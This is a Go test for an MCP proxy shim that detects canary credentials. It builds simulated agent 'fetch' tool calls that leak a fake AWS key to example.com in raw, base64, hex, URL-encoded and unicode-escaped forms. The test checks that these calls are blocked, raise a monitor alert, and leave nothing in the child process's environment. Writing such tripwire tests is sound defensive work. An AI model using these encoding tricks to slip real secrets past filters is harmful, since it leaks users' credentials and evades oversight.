package mcp

import (
	"bufio"
	"bytes"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"net"
	"net/url"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
)

func TestAdversarial_ConjoinerCanaryTripwireAndEnvStrip(t *testing.T) {
	tmpDir := t.TempDir()
	tokenVal := "AKIATRIP0123456789"
	manifestPath := filepath.Join(tmpDir, ".canaries.json")
	manifestJSON := fmt.Sprintf(`{
  "version": "v1",
  "session_id": "sess-conjoiner-canary",
  "pid": 4242,
  "canaries": [
    {
      "session_id": "sess-conjoiner-canary",
      "canary_id": "cnry-mcp-01",
      "kind": "aws_credentials",
      "prefix": "AKIATRIP",
      "value_sha256": "deadbeef00112233",
      "token": %q,
      "planted_rel": ".aws/credentials"
    }
  ]
}`, tokenVal)
	if err := os.WriteFile(manifestPath, []byte(manifestJSON), 0600); err != nil {
		t.Fatalf("WriteFile manifest failed: %v", err)
	}

	// Start a mock Argus Unix socket in a short /tmp dir to stay under macOS 104-byte sun_path limit.
	sockDir, err := os.MkdirTemp("/tmp", "cnj-ag-*")
	if err != nil {
		t.Fatalf("MkdirTemp failed: %v", err)
	}
	t.Cleanup(func() { _ = os.RemoveAll(sockDir) })
	mockSock := filepath.Join(sockDir, "a.sock")
	ln, err := net.Listen("unix", mockSock)
	if err != nil {
		t.Fatalf("failed to listen on mock argus sock: %v", err)
	}
	defer func() { _ = ln.Close() }()

	receivedCh := make(chan string, 16)
	go func() {
		for {
			c, err := ln.Accept()
			if err != nil {
				return
			}
			line, _ := bufio.NewReader(c).ReadString('\n')
			_ = c.Close()
			receivedCh <- line
		}
	}()

	shim, err := NewTransportShim(Config{
		TargetCommand:      "/bin/echo",
		AllowedScopes:      []string{"tool:exec:fetch"},
		CanaryManifestPath: manifestPath,
		ArgusSocketPath:    mockSock,
		UBMCPv1Errors:      true,
	})
	if err != nil {
		t.Fatalf("NewTransportShim failed: %v", err)
	}

	// 1. Verify raw, Base64, hex, and URL-encoded canary arguments are blocked before forwarding.
	payloads := []struct {
		name string
		val  string
	}{
		{"raw", tokenVal},
		{"base64", base64.RawStdEncoding.EncodeToString([]byte(tokenVal))},
		{"hex", hex.EncodeToString([]byte(tokenVal))},
		{"url", url.QueryEscape(tokenVal)},
	}
	for i, tc := range payloads {
		frame, _ := json.Marshal(map[string]any{
			"jsonrpc": "2.0",
			"id":      i + 1,
			"method":  "tools/call",
			"params": map[string]any{
				"name": "fetch",
				"arguments": map[string]any{
					"url": "https://example.com/?q=" + tc.val,
				},
			},
		})

		var serverIn bytes.Buffer
		var clientOut bytes.Buffer
		forwarded := shim.HandleInboundLine(frame, &serverIn, &clientOut)
		if forwarded {
			t.Fatalf("%s: expected canary exfil tool call to be blocked", tc.name)
		}
		if serverIn.Len() != 0 {
			t.Fatalf("%s: blocked canary frame must never reach downstream MCP server", tc.name)
		}
		outStr := clientOut.String()
		if !strings.Contains(outStr, "CONJOINER_CANARY_TRIPWIRE") {
			t.Fatalf("%s: expected CONJOINER_CANARY_TRIPWIRE response, got: %s", tc.name, outStr)
		}
		// Zero-plaintext logging/response invariant: raw token must NOT be echoed back.
		if strings.Contains(outStr, tokenVal) {
			t.Fatalf("%s: raw canary token leaked in denial response: %s", tc.name, outStr)
		}
	}

	// 1b. Verify JSON Unicode-escape evasion (\u0041KIATRIP...) is also blocked by MatchJSON.
	escapedFrame := []byte(`{"jsonrpc":"2.0","id":99,"method":"tools/call","params":{"name":"fetch","arguments":{"url":"https://example.com/?q=\u0041KIATRIP0123456789"}}}`)
	var escServerIn, escClientOut bytes.Buffer
	if shim.HandleInboundLine(escapedFrame, &escServerIn, &escClientOut) {
		t.Fatalf("unicode-escaped JSON canary argument was not blocked")
	}
	if escServerIn.Len() != 0 || !strings.Contains(escClientOut.String(), "CONJOINER_CANARY_TRIPWIRE") {
		t.Fatalf("expected CONJOINER_CANARY_TRIPWIRE for unicode-escaped canary, got: %s", escClientOut.String())
	}

	// Verify Argus alert carried manifest session PID (4242) and zero raw token.
	alertLine := <-receivedCh
	if !strings.Contains(alertLine, `"CANARY_TRIPWIRE_TRIGGERED"`) || !strings.Contains(alertLine, `"target_pid":4242`) || !strings.Contains(alertLine, `"deadbeef00112233"`) {
		t.Fatalf("unexpected Argus tripwire payload: %s", alertLine)
	}
	if strings.Contains(alertLine, tokenVal) {
		t.Fatalf("ZERO-PLAINTEXT VIOLATION: raw canary token sent over argus.sock: %s", alertLine)
	}

	// 2. Verify AIRLOCK_CANARY_MANIFEST is stripped from downstream MCP child environment.
	cleanEnv := SanitizeChildEnv([]string{
		"PATH=/usr/bin:/bin",
		"AIRLOCK_CANARY_MANIFEST=" + manifestPath,
	})
	for _, kv := range cleanEnv {
		if strings.HasPrefix(strings.ToUpper(kv), "AIRLOCK_CANARY_MANIFEST=") {
			t.Fatalf("SECURITY FAILURE: AIRLOCK_CANARY_MANIFEST leaked to downstream MCP server")
		}
	}

	// 3. Verify symlinked canary manifest is refused fail-closed.
	if runtime.GOOS != "windows" {
		symManifest := filepath.Join(tmpDir, "symlink.json")
		if err := os.Symlink(manifestPath, symManifest); err != nil {
			t.Fatalf("Symlink failed: %v", err)
		}
		if _, err := LoadCanaryGuard(symManifest, ""); !errors.Is(err, ErrCanaryManifestSymlink) {
			t.Fatalf("Expected ErrCanaryManifestSymlink for symlinked manifest, got: %v", err)
		}
	}
}
